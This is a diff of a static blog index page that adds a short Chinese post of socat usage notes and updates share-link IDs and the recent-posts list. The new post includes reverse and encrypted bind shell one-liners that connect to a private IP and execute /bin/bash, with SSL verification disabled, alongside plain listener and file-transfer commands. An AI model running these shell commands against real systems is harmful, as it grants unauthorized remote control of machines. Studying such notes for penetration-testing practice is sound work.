@@ -64,6 +64,64 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Socat使用" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" class="article-date">
+  <time datetime="2021-07-16T07:44:39.000Z" itemprop="datePublished">2021-07-16</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h5 id="建立监听器"><a href="#建立监听器" class="headerlink" title="建立监听器"></a>建立监听器</h5><p>socat -d -d tcp4-listen:port stdout                                     <code>--&gt; nc -lvvp</code></p>
+<h5 id="建立连接"><a href="#建立连接" class="headerlink" title="建立连接"></a>建立连接</h5><p>socat - tcp4:ip:port                                                                    <code>     --&gt; nc ip port</code></p>
+<h5 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h5><p>接收:</p>
+<p>socat tcp4:ip:port file:filename,create</p>
+<p>传输:</p>
+<p>socat tcp4-listen:4444,fork file:filename</p>
+<p><code>fork创建子进程,可以建立多个连接</code></p>
+<p><strong>可以双向传输</strong></p>
+<h5 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h5><p>反向:</p>
+<p>socat -d -d tcp4-listen:4444 stdout            建立监听</p>
+<p>socat tcp4:192.168.1.135:4444 exec:/bin/bash            反弹shell</p>
+<p>正向:</p>
+<p>加密传输</p>
+<p><strong>生成公钥和私钥</strong></p>
+<p>openssl req -newkey rsa:2048 -nodes -keyout <code>bind.key</code> -x509 -days <code>365</code> -out <code>bind.crt</code>    </p>
+<p><strong>把公钥和私钥转化为socat传输的格式</strong></p>
+<p>cat bind.key bind.crt &gt; bind.pem            </p>
+<p><strong>建立监听,并反弹shell</strong></p>
+<p>socat openssl-listen:port,verify=0,cert=xxx.pem,fork exec:/bin/bash</p>
+<p><strong>建立连接</strong></p>
+<p>socat - openssl:ip:port,verify=0</p>
+<p><code>!!!:verify=0 --&gt; 禁用ssl</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/16/Socat%E4%BD%BF%E7%94%A8/" data-id="ckr61gof500042wvjeodb2ad3" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
     <article id="post-信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
     <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
@@ -164,7 +222,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckr2vghlu0005c8vjhpvm8220" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckr61gof700062wvj7trt3blq" class="article-share-link">Share</a>
       
       
     </footer>
@@ -216,7 +274,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckr2vgho80007c8vjdki72iro" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/12/%E6%B3%A8%E5%86%8C%E8%A1%A8%E8%87%AA%E5%90%AF%E5%8A%A8%E5%92%8C%E7%B2%98%E6%BB%9E%E9%94%AE%E5%90%8E%E9%97%A8/" data-id="ckr61gofa00082wvj3eqkbkld" class="article-share-link">Share</a>
       
       
     </footer>
@@ -293,7 +351,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckr2vghlv0006c8vj4pofapvs" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2021/07/10/%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/" data-id="ckr61gof800072wvj9j1p5sey" class="article-share-link">Share</a>
       
       
     </footer>
@@ -330,7 +388,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckr2vghlr0003c8vj7vahehuy" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/" data-id="ckr61gof400032wvjhfnhblhh" class="article-share-link">Share</a>
       
       
     </footer>
@@ -367,7 +425,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckr2vghlp0002c8vjfolvfbom" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/" data-id="ckr61goey00012wvj3m5c9k2f" class="article-share-link">Share</a>
       
       
     </footer>
@@ -435,7 +493,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckr2vghlm0001c8vjfs4x4y9i" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/12/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" data-id="ckr61gof300022wvjalf86gab" class="article-share-link">Share</a>
       
       
     </footer>
@@ -472,7 +530,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckr2vghlc0000c8vj32bs2mr0" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/Hello/" data-id="ckr61goes00002wvj77p0cuqv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -521,7 +579,7 @@ default:
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckr2vghls0004c8vj9rjh9rom" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2020/08/11/hello-world/" data-id="ckr61gof600052wvj9h88gfds" class="article-share-link">Share</a>
       
       
     </footer>
@@ -562,6 +620,10 @@ default:
       <ul>
         
           <li>
+            <a href="/2021/07/16/Socat%E4%BD%BF%E7%94%A8/">Socat使用</a>
+          </li>
+        
+          <li>
             <a href="/2021/07/14/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">信息搜集</a>
           </li>
         
@@ -575,10 +637,6 @@ default:
         
           <li>
             <a href="/2020/08/28/SQLlow%E7%AD%89%E7%BA%A7%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5/">SQLlow等级手工注入</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/27/SQLlow%E7%AD%89%E7%BA%A7%E5%B7%A5%E5%85%B7%E6%B3%A8%E5%85%A5/">SQLlow等级工具注入</a>
           </li>
         
       </ul>
